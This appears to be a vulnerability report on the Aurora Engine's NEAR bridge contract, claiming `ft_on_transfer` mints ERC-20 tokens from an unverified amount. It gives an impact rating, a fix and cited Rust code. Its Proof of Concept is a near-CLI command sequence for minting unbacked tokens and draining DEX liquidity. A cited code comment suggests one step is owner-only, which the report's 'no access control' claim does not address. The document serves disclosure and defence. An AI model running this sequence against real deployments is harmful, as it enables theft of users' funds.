### Title
Unverified `amount` in `ft_on_transfer` Allows Any Registered NEP-141 Account to Mint Unbacked ERC-20 Tokens — (`engine/src/contract_methods/connector.rs`)

---

### Summary

`ft_on_transfer` is a public NEAR entry point on the Aurora Engine. It is intended to be called by a NEP-141 token contract as a callback after a real `ft_transfer_call` has already moved tokens into Aurora's custody. However, the function performs no verification that any actual token transfer occurred. It blindly trusts the `amount` field supplied in the JSON arguments. Because `deploy_erc20_token` also has no access control, an attacker can register an arbitrary NEP-141 account, then call `ft_on_transfer` directly from that account with an attacker-chosen `amount`, causing Aurora to mint ERC-20 tokens with no backing.

---

### Finding Description

`ft_on_transfer` is exposed as a public WASM entry point: [1](#0-0) 

Its implementation reads the `amount` from the JSON args and, when the predecessor is a registered NEP-141 (i.e., not the ETH connector), immediately calls `receive_erc20_tokens`: [2](#0-1) 

`receive_erc20_tokens` takes `args.amount` at face value and calls `mint` on the corresponding ERC-20 contract: [3](#0-2) 

The only guard is whether the predecessor is a registered NEP-141 (`get_erc20_from_nep141` must succeed). But `deploy_erc20_token` has no access control — any NEAR account can register any NEP-141: [4](#0-3) 

There is no check that the predecessor actually executed an `ft_transfer_call` that moved tokens into Aurora's custody before calling `ft_on_transfer`.

---

### Impact Explanation

**Critical — Direct theft of user funds.**

An attacker mints an arbitrary quantity of ERC-20 tokens on Aurora with zero NEP-141 backing. Those tokens are indistinguishable from legitimately bridged tokens and can be swapped on Aurora DEXes for ETH, USDC, or any other asset held in liquidity pools, draining real user funds. Every legitimate holder of the corresponding ERC-20 token is left with an unbacked, worthless position.

---

### Likelihood Explanation

**High.** The attack requires only:
1. Creating a NEAR account (permissionless, costs fractions of a cent).
2. Calling `deploy_erc20_token` on Aurora (no access control).
3. Calling `ft_on_transfer` from that account with an arbitrary `amount`.

No privileged access, leaked keys, or governance capture is needed. Any NEAR user can execute this in three transactions.

---

### Recommendation

Inside `ft_on_transfer`, after routing to `receive_erc20_tokens`, verify that the predecessor's NEP-141 balance held by the Aurora contract actually increased by at least `args.amount` since the start of the call, **or** enforce that `ft_on_transfer` can only be reached as a callback of a `ft_transfer_call` promise (i.e., check `promise_results_count() >= 1` and that the predecessor is the token contract that initiated the transfer). The cleanest fix is to add a cross-contract balance check: query the NEP-141 contract for Aurora's balance before and after, and only mint the delta.

---

### Proof of Concept

```
# Step 1 – attacker creates evil.near and deploys a minimal NEAR contract
near create-account evil.near --masterAccount attacker.near
near deploy evil.near --wasmFile minimal_nep141.wasm

# Step 2 – register evil.near as a NEP-141 on Aurora (no access control)
near call aurora deploy_erc20_token \
  '{"nep141": "evil.near"}' \
  --accountId attacker.near

# Step 3 – call ft_on_transfer directly from evil.near
#   predecessor = evil.near  →  receive_erc20_tokens branch
#   amount = 1_000_000_000_000_000_000  (attacker-chosen)
#   msg = hex(attacker_evm_address)
near call aurora ft_on_transfer \
  '{"sender_id":"attacker.near","amount":"1000000000000000000","msg":"<attacker_evm_address_hex>"}' \
  --accountId evil.near

# Result: Aurora mints 1e18 ERC-20 tokens to attacker's EVM address
# with zero NEP-141 tokens ever transferred to Aurora.
# Attacker swaps on Aurora DEX → drains real user funds.
```

The root cause is at: [5](#0-4) 

and the minting call that uses the unverified amount: [6](#0-5)

### Citations

**File:** engine/src/lib.rs (L602-610)
```rust
    #[unsafe(no_mangle)]
    pub extern "C" fn ft_on_transfer() {
        let io = Runtime;
        let env = Runtime;
        let mut handler = Runtime;
        contract_methods::connector::ft_on_transfer(io, &env, &mut handler)
            .map_err(ContractError::msg)
            .sdk_unwrap();
    }
```

**File:** engine/src/contract_methods/connector.rs (L62-109)
```rust
pub fn ft_on_transfer<I: IO + Copy, E: Env, H: PromiseHandler>(
    io: I,
    env: &E,
    handler: &mut H,
) -> Result<Option<SubmitResult>, ContractError> {
    with_hashchain(io, env, function_name!(), |mut io| {
        require_running(&state::get_state(&io)?)?;
        let current_account_id = env.current_account_id();
        let predecessor_account_id = env.predecessor_account_id();
        let mut engine: Engine<_, _> = Engine::new(
            predecessor_address(&predecessor_account_id),
            current_account_id.clone(),
            io,
            env,
        )?;

        sdk::log!("Call ft_on_transfer");

        let args: FtOnTransferArgs = read_json_args(&io)?;
        let result = if predecessor_account_id == get_connector_account_id(&io)? {
            engine.receive_base_tokens(&args)
        } else {
            engine.receive_erc20_tokens(
                &predecessor_account_id,
                &args,
                &current_account_id,
                handler,
            )
        };

        #[allow(clippy::used_underscore_binding)]
        let amount_to_return = if let Err(_err) = &result {
            sdk::log!("Error in ft_on_transfer: {_err:?}");
            // An error occurred, so we need to return the amount of tokens to the sender.
            args.amount.as_u128()
        } else {
            // Everything is ok, so return 0.
            0
        };

        let output = crate::prelude::format!("\"{amount_to_return}\"");
        io.return_output(output.as_bytes());

        // In case of an error, we just return Ok(None) to avoid a panic in the contract. It's ok
        // because in case of an error, we already returned the amount of tokens to the sender.
        Ok(result.unwrap_or(None))
    })
}
```

**File:** engine/src/contract_methods/connector.rs (L112-159)
```rust
pub fn deploy_erc20_token<I: IO + Copy, E: Env, H: PromiseHandler>(
    io: I,
    env: &E,
    handler: &mut H,
) -> Result<PromiseOrValue<Address>, ContractError> {
    with_hashchain(io, env, function_name!(), |mut io| {
        require_running(&state::get_state(&io)?)?;
        let bytes = io.read_input().to_vec();
        let args =
            DeployErc20TokenArgs::deserialize(&bytes).map_err(|_| errors::ERR_BORSH_DESERIALIZE)?;

        match args {
            DeployErc20TokenArgs::Legacy(nep141) => {
                let address = engine::deploy_erc20_token(nep141, None, io, env, handler)?;

                io.return_output(
                    &borsh::to_vec(address.as_bytes()).map_err(|_| errors::ERR_SERIALIZE)?,
                );
                Ok(PromiseOrValue::Value(address))
            }
            DeployErc20TokenArgs::WithMetadata(nep141) => {
                let args = borsh::to_vec(&nep141).map_err(|_| errors::ERR_SERIALIZE)?;
                let base = PromiseCreateArgs {
                    target_account_id: nep141,
                    method: "ft_metadata".to_string(),
                    args: vec![],
                    attached_balance: ZERO_YOCTO,
                    attached_gas: READ_PROMISE_ATTACHED_GAS,
                };
                let callback = PromiseCreateArgs {
                    target_account_id: env.current_account_id(),
                    method: "deploy_erc20_token_callback".to_string(),
                    args,
                    attached_balance: ZERO_YOCTO,
                    attached_gas: DEPLOY_ERC20_TOKEN_CALLBACK_ATTACHED_GAS,
                };
                // Safe because these promises are read-only calls to the main engine contract
                // and this transaction could be executed by the owner of the contract only.
                let promise_args = PromiseWithCallbackArgs { base, callback };
                let promise_id = handler.promise_create_with_callback(&promise_args);

                handler.promise_return(promise_id);

                Ok(PromiseOrValue::Promise(promise_args))
            }
        }
    })
}
```

**File:** engine/src/engine.rs (L796-843)
```rust
    pub fn receive_erc20_tokens<P: PromiseHandler>(
        &mut self,
        token: &AccountId,
        args: &FtOnTransferArgs,
        current_account_id: &AccountId,
        handler: &mut P,
    ) -> Result<Option<SubmitResult>, ContractError> {
        let amount = args.amount.as_u128();
        // Parse message to determine recipient
        let mut recipient = {
            // The message should contain the recipient EOA address.
            let message = args.msg.strip_prefix("0x").unwrap_or(&args.msg);
            // Recipient - 40 characters (Address in hex without '0x' prefix)
            if message.len() < 40 {
                return Err(ParseOnTransferMessageError::WrongMessageFormat.into());
            }
            let mut address_bytes = [0; 20];
            hex::decode_to_slice(&message[..40], &mut address_bytes)
                .map_err(|_| ParseOnTransferMessageError::WrongMessageFormat)?;
            Address::from_array(address_bytes)
        };

        if let Some(fallback_address) = silo::get_erc20_fallback_address(&self.io)
            && !silo::is_allow_receive_erc20_tokens(&self.io, &recipient)
        {
            recipient = fallback_address;
        }

        let erc20_token = get_erc20_from_nep141(&self.io, token)?;
        let erc20_admin_address = current_address(current_account_id);
        let result = self
            .call(
                &erc20_admin_address,
                &erc20_token,
                Wei::zero(),
                setup_receive_erc20_tokens_input(&recipient, amount),
                u64::MAX,
                Vec::new(), // TODO: are there values we should put here?
                Vec::new(),
                handler,
            )
            .and_then(submit_result_or_err)?;

        sdk::log!("Mint {amount} ERC-20 tokens for: {}", recipient.encode());

        // Return SubmitResult so that it can be accessed in standalone engine.
        // This is used to help with the indexing of bridge transactions.
        Ok(Some(result))
```
